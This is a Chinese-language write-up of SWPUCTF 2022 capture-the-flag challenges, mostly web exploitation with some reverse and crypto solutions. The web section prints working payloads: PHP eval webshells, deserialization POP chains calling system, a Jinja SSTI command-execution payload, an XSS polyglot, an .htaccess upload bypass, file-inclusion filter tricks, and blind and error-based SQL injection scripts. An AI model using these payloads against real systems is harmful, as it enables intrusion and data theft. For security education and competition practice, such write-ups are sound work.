> 部分wp来自 [2022 SWPUCTF Web Writeup](https://mp.weixin.qq.com/s/7vOX5hgN90Sejdn6SwWz-A) ，[问谛居 - 欢迎做客问谛居 (wd-ljt.com)](https://www.wd-ljt.com/)，榜一大佬，Tony师傅，没有完全按题目顺序写题解

GitHub版本：[yjprolus/SWPUCTF2022: SWPUCTF2022 wp (github.com)](https://github.com/yjprolus/SWPUCTF2022)

# web

## 欢迎来到Web安全

查看源码搜索 swpu 得到flag

## easy_sql

源码提示参数为 wllm

```shell
sqlmap -u "http://175.24.172.136:30083/?wllm=1" -D test_db -T test_tb -C fllaag --dump

sqlmap -u "http://175.24.172.136:30071/?wllm=1" -D test_peng -T test_2tb -C ffflllaaaggg --dump # 迷惑性选项
```

## happy_rce

访问 `next.php`，根据提示访	问 `jiangnaij.php`

```php
<?php
error_reporting(0);
header("Content-Type:text/html;charset=utf-8");
highlight_file(__FILE__);
if (isset($_GET['url'])) {
  $ip=$_GET['url'];
  if(preg_match("/cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $ip)){
      die('换个方法吧？被过滤啦！');
  }
  eval($ip);
}
?> 
```

蚁剑连接 `http://175.24.172.136:30023/jiangnaij.php?url=eval($_POST[%27yjprolus%27]);` ，密码为 `yjprolus`，文件管理定位到根目录下找到 flag

## happy_php

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
$a=0.58;
if (!preg_match('/[^0-9]/',$_GET['jiangnaij'])){
    if ((int)(substr(md5($_GET['jiangnaij']),0,6)) === 666666) {
        if (isset($_POST['pysnow']) and isset($_POST['M1sery']))
        {
            if ($_POST['pysnow'] != $_POST['M1sery'])
            {
                if (md5($_POST['pysnow']) == md5($_POST['M1sery'])){
                    if (isset($_POST['s0rry']) and isset($_POST['DSTBP']))
                    {
                        if ((string)$_POST['s0rry'] != (string)$_POST['DSTBP'])
                        {
                            if (md5($_POST['s0rry']) === md5($_POST['DSTBP'])) 
                            {
                                if ($_GET['csc8'] == intval($a * 100)){
                                    include '/flag.php';
                                    echo $flag;
                                }
                                else echo "csc8说你错了";
                            }
                            else echo 's0rry和DSTBP说你错了';
                        }
                        else echo "请输入不同的s0rry，DSTBP";
                    }
                    else echo "s0rry和DSTBP说快来玩";
                }
                else echo 'pysnow和M1sery说你错了';
            }
            else echo "请输入不同的pysnow，M1sery";
        }
        else echo "pysnow和M1sery说快来玩";
    }
    else echo "相等吗？？？";
}
else echo "输入一个数，这个数md5加密后前六位全是6！";
相等吗？？？
```

用下面的脚本爆破得到md5加密后前六位全是6的数：

```python
# -*- coding: utf-8 -*-
import multiprocessing
import hashlib
import random
import string
import sys
CHARS = string.digits

def cmp_md5(substr, stop_event, str_len, start=0, size=20):
    global CHARS
    while not stop_event.is_set():
        rnds = ''.join(random.choice(CHARS) for _ in range(size))
        md5 = hashlib.md5(rnds.encode('utf-8'))
        if md5.hexdigest()[start: start+str_len] == substr:
            print(rnds)
            stop_event.set()


substr = sys.argv[1].strip()
start_pos = int(sys.argv[2]) if len(sys.argv) > 1 else 0
str_len = len(substr)
cpus = multiprocessing.cpu_count()
stop_event = multiprocessing.Event()
processes = [multiprocessing.Process(target=cmp_md5, args=(substr,
                                        stop_event, str_len, start_pos))
                for i in range(cpus)]
for p in processes:
    p.start()
for p in processes:
    p.join()

'''
python ch_md5.py "666666" 0  # 命令行运行，得到如下结果 
61146528383226743337

?jiangnaij=61146528383226743337&csc8=57

'''
```

`(string)$_POST['s0rry'] != (string)$_POST['DSTBP']` 部分为md5碰撞。先用 hackbar 发送原来的请求，BP抓包，发到 Repeater ，再粘贴一次POST的值即可，多测试几次（做法来自https://www.bilibili.com/video/BV1514y1s7od/?spm_id_from=333.337.search-card.all.click&vd_source=f7d99068aaef12987e4f91ab71f0546a&t=395.9，误打误撞搞出来了，但是原理很简单）

```shell
GET http://175.24.172.136:30070/?jiangnaij=61146528383226743337&csc8=57

POST pysnow[]=NKCDZO&M1sery[]=40610708&s0rry=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&DSTBP=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
```

## do_not_wakeup

序列化得 `O:1:"A":1:{s:19:"Aare_you_a_hacker";s:9:"yesyesyes";}` ，修改绕过wakeup得 O:1:"A":1:{s:19:"Aare_you_a_hacker";s:9:"yesyesyes";} ，URL编码后payload如下： `data=O%3A1%3A%22A%22%3A5%3A%7Bs%3A19%3A%22%00A%00are_you_a_hacker%22%3Bs%3A9%3A%22yesyesyes%22%3B%7D`

```php
<?php
class A
{
    private $are_you_a_hacker='yesyesyes';
}
$a=new A();
echo(urlencode(serialize($a)));
?>
```

## can you faster

本来以为是 gunicorn20.0.4请求走私，后面发现是道爆破题，参考  ACT Team 的代码：

```python
import requests
import time
from bs4 import BeautifulSoup

url = 'http://175.24.172.136:30041/'
s = requests.session()
for i in range(200):
 print(i)
 res = s.get(url)
 soup = BeautifulSoup(res.text,'html.parser')
 get_express = soup.find_all('a')[2].text
 get_express = get_express.replace('=','')
 exres = eval(get_express)
 time.sleep(1)
 data = {
  'result':exres,
  'submit': '提交'}
 r = s.post(url,data=data)
#  print(r.text) 
 if 'swpu{' in r.text:
  print(r.text)
  break
```

## ez_include

GET `/?key=json_last_error` 返回0 弱类型比较

POST

```
file=php://filter/convert.%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
```

## newnew

考点应该是PHP原生类，根据搜索得到的结果尝试 DirectoryIterator、FilesystemIterator、SplFileObject、GlobIterator得到payload：`O:1:"A":3:{s:1:"a";s:13:"SplFileObject";s:1:"b";s:12:"/fl1aaaaaaa9";}`，构造方法如下：

```php
<?php

class A
{
    public $a;
    public $b;

    public function __destruct()
    {
        echo new $this->a($this->b);  
    }
}

$exp=new A();
$exp->a='SplFileObject'; // DirectoryIterator FilesystemIterator SplFileObject  GlobIterator ReflectionClass ReflectionMethod
$exp->b='/fl1aaaaaaa9';   // glob:///*   fl1aaaaaaa9
// echo new $exp->a($exp->b);
echo(serialize($exp));
```

## easy_java

不会~

## easy_flask

ssti注入漏洞，payload如下

```python
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("cat flag").read()') }} # ls 查看得到当前为 / 目录且flag文件在此处
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
```

## easy_xss

hackbar 的 payload 弹flag字段即可得到flag

`jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert("flag") )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert("flag")//>\x3e`

## baby_pop

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
include "class.php";

if (isset($_GET['source'])) {
    show_source("class.php");
} else {
    unserialize($_GET['pop']);
}
```

``?source=1 进入下一步``

```php
class dstbp
{
    private $cmd;
    private $content;

    public function __construct($cmd, $content)
    {
        $this->cmd = $cmd;
        $this->content = $content;
    }

    public function __invoke()
    {
        ($this->cmd)($this->content);
    }
}

class m1sery
{
    public $ctf;
    public $time = "Two and a half years";

    public function __construct($ctf)
    {
        $this->ctf = $ctf;
    }


    public function __toString()
    {
        return $this->ctf->show();
    }

    public function show(): string
    {
        return $this->ctf . ": Duration of practice: 2.5 years";
    }


}

class s0rry
{
    private $name;
    private $password;
    public $hint = "hint is depend on you";
    public $key;

    public function __construct($name, $password)
    {
        $this->name = $name;
        $this->password = $password;
    }


    public function __destruct()
    {
        echo $this->hint;
    }


}

class jiangnaij
{
    protected $code;


    public function __call($name, $arguments)
    {
        ($this->code)();
    }
}
```

ACT Team 的 exp 如下：

```php
<?php

class dstbp
{
    private $cmd;
    private $content;

    public function __construct()
    {
        $this->cmd = 'system';
        $this->content = 'cat /flag';
    }
}

class m1sery
{
    public $ctf;
    public $time;
}

class s0rry
{
    private $name;
    private $password;
    public $hint;
    public $key;
}

class jiangnaij
{
    protected $code;
    public function __construct()
    {
        $this->code = new dstbp();
    }
}
$j = new jiangnaij();
$m = new m1sery();
$m->ctf = $j;
$s = new s0rry();
$s->hint = $m;
echo urlencode(serialize($s));
```

## php_upload

文件上传后，直接包含！

```php
$wllm = waf($_GET["wllm"]);
include("$wllm");
```

先传图片木马，之后包含 `?wllm=upload/546abe96bee75c6fda395809c08708d1/m.gif`,既可getshell.

## ez_upload

`.htaccess`利用，base64编码绕过 `<`检测。修改MIME为jpg类型

```
php_value auto_append_file "php://filter/convert.base64-decode/resource=Tao.php"
```

```
# Tao.php 内容如下：
PD9waHAgZWNobyAiVGFvIjtldmFsKCRfUkVRVUVTVFswXSk7Pz4=
# 解码为：
# <?php echo "Tao";eval($_REQUEST[0]);?>
```

之后anstword  bypass disable_functions

或者

```php
?0=var_dump(new DirectoryIterator("glob:///f*"));
# /fllllllllllll4g
?0=mkdir('Tao');chdir('Tao');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo (file_get_contents('fllllllllllll4g'));
```

## baby_ssrf

### flag1

`POST  url=http://sudo.cc/flag.php  -> swpu{werefgou-`

### flag2

访问 /.git 得到，/.svn是迷惑选项

### flag3

源码泄露扫描出www.zip/wwwroot.zip/backup.sql，flag在/wwwroot.zip下的flag3.txt中

## sql2

extractvalue报错注入，大小写绕过关键词过滤，/**/绕过空格过滤

```sql

?wllm='/**/And/**/extractvalue(rand(),Concat(CHAR(126),user(),CHAR(126)))%23
```

```sql
/?wllm='/**/And/**/extractvalue(rand(),Concat(CHAR(126),(Select/**/Group_Concat(database_name)/**/From/**/mysql.innodb_table_stats),CHAR(126)))%23
# XPATH syntax error: '~mysql,test_db,test_db~'
```

```sql
/?wllm='/**/And/**/extractvalue(rand(),Concat(CHAR(126),(Select/**/Group_Concat(database_name)/**/From/**/mysql.innodb_table_stats),CHAR(126)))%23
# '~gtid_slave_pos,test_tb,users~'
```

无列名注入

```sql
/?wllm='/**/And/**/extractvalue(rand(),Concat(CHAR(126),(Select/**/`2`/**/From(Select/**/1,2/**/Union/**/Select/**/*/**/From/**/test_tb)a/**/Limit/**/1,1),CHAR(126)))%23  
# XPATH syntax error: '~swpu{aba16000-448a-4bfb-874f-7d'

/?wllm='/**/And/**/extractvalue(rand(),Concat(CHAR(126),(Select/**/Reverse(`2`)/**/From(Select/**/1,2/**/Union/**/Select/**/*/**/From/**/test_tb)a/**/Limit/**/1,1),CHAR(126)))%23

XPATH syntax error: '~}69e2a4f858d7-f478-bfb4-a844-00'
```

其实盲注也是可以的，具体见sql3

## sql3

```python
import requests
import time
# swpu_wllm_boolsql
# gtid_slave_pos,flag,username
# id,username,password,id,flag

def inject(url):
 name = ''

 for i in range(1,100000):
  low = 32
  high = 128
  mid = (low + high) // 2
  while low < high:
   #payload = '0\"/**/or/**/iF(Ascii(Substr((Select/**/Group_concat(table_name)/**/From/**/mysql.innodb_table_stats),%d,1))>%d,Sleep(1),0)#' % (i,mid)
   #print(payload)
   #payload = '0\"/**/or/**/If(Ascii(Substr((Select/**/Group_concat(column_name)/**/From/**/information_schema.columns/**/Where/**/table_schema=0x737770755F776C6C6D5F626F6F6C73716C),%d,1))>%d,Sleep(1),0)#'  % (i,mid)
   payload = '0\"/**/or/**/If(Ascii(Substr((Select/**/Group_concat(flag)/**/From/**/username),%d,1))>%d,Sleep(1),0)#'  % (i,mid)
   print(payload)
   params = {'username':payload}
   start_time = time.time() # 注入前的系统时间
   r = requests.post(url,data = params)
   end_time = time.time()  #  注入后的时间
   if end_time - start_time > 1:
    low = mid + 1
   else:
    high = mid
   mid = (low + high) // 2

  if mid == 32:
   break
  name = name + chr(mid) 
  print(name)

inject("http://175.24.172.136:30063/")
```

# misc

# reverse

## 一道简单的签到

记事本/010Editor打开搜索 swpu 得到flag：`swpu{youfindthesecret!!}`

## xor

ida打开定位到核心代码段：

![在这里插入图片描述](https://img-blog.csdnimg.cn/14ea27ecf06b49019c7e9a2298b84dfa.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/47c17d59347a4e10afd3d7a5ab4e0a56.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/ef900b931c0b4f1e9785ff87889e3e3a.png)

py爆破计算

```python
key='SWPU'
flag=''
result=[32,32,32,32,40,46,63,32,12,48,53,33,12,36,96,39,33,46,119,38,12,49,60,52,52,42]
for i in range(len(result)):
    flag+=chr(result[i]^ord(key[i%4]))
print(flag)  # swpu{you_get_s0rry's_flag}
```

## SUPX

## 64base

```python
import base64
a = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ+/'
b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
c = '2T3M3xJr3wqT4tfeuenTq9mNwBvOsdzJ1hQ='
table = str.maketrans(a,b)
d = c.translate(table)
data = base64.b64decode(d)
print(data) # swpu{Qud7y1DPCwB31ZUrH6ml}
```

## swpu_easy_android

反编译得到 check 类，在 idea 中运行测试得到密码为 `f53720bd5d9f07a8dc1028df48b8e1bb` ，登录进下一个界面。然后根据提示图片识图得到70个字符，10个一组分成7行组成一个迷宫

![图源校赛榜一大佬](https://img-blog.csdnimg.cn/875916cf0b7542c7a73c3a9a2758c7c7.png)

根据hint得到flag：`wllm{ssaaasaassdddwf537}`

## pyc大挑战

`uncompyle6 -o rc4.py rc4.pyc` 反编译得到源码

```python
def init(key):
    sBox = []
    index = 0
    k = []
    for i in range(256):
        sBox.append(i)
        k.append(ord(key[(i % len(key))]))
    for i in range(256):
        index = (index + sBox[i] + k[i]) % 256
        sBox[i], sBox[index] = sBox[index], sBox[i]
    return sBox


def rc4_crypt(data, sBox):
    i = 0
    j = 0
    t = 0
    for k in range(len(data)):
        i = (i + 1) % 256
        j = (j + sBox[i]) % 256
        sBox[i], sBox[j] = sBox[j], sBox[i]
        t = (sBox[i] + sBox[j]) % 256
        data[k] ^= sBox[t]
    return data


def data_to_str(data):
    str = ''
    for i in range(len(data)):
        str += chr(data[i])
    return str


def str_to_data(str):
    d = []
    for i in range(len(str)):
        d.append(ord(str[i]))
    return d


data = [ 115, 119, 112, 117, 123, 114, 99, 52, 95, 49, 115, 95, 101, 52, 115, 121, 125]
flag = input('请输入flag：')
key = 'wllm'
sBox = init(key)
flag = str_to_data(flag)
res = rc4_crypt(flag, sBox)
if flag == res:
    print('yes')
else:
    print('wrong')
```

# crypto

## 善哉善哉

010Editor打开，末尾有摩斯密码：

![在这里插入图片描述](https://img-blog.csdnimg.cn/853c79633d9a418baed0322e9457e482.png)

新佛曰解码得：施主，此次前来，不知有何贵干?

再根据文件的属性中提示的MD5加密得到 `NSSCTF{7551772a99379ed0ae6015a470c1e335}`

## All in Base

赛后听解出来的说，有个base92/45

## AES

网站 [AES在线加密解密工具 - MKLab在线工具](https://www.mklab.cn/utils/aes) 解密，选项设置为 nopadding 128位。

## 爆破MD5

```python
#coding: utf-8
import hashlib
dic = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-'
dic0=dic.to
for a in dic:
    for b in dic:
        for c in dic:
            for d in dic:
                # flag = 'Boom_MD5' + str(a) + str(b) + + str(c) + + str(d)
                flag = 'Boom_MD5'+a+b+c+d
                md5 = hashlib.md5(flag.encode('utf-8')).hexdigest()
                if md5[:27] == "0618ac93d4631df725bceea74d0":
                    print(flag)
print("over")
# data = 'Boom_MD5****'
# Boom_MD5_NSS
# 0618ac93d4631df725bceea74d0*****
# NSSCTF{0618ac93d4631df725bceea74d0fe071}


```

## Welcome to Modern Cryptography

直接用 [在线RSA私钥加密解密、RSA private key encryption and decryption--查错网 (chacuo.net)](http://tool.chacuo.net/cryptrsaprikey) 解密
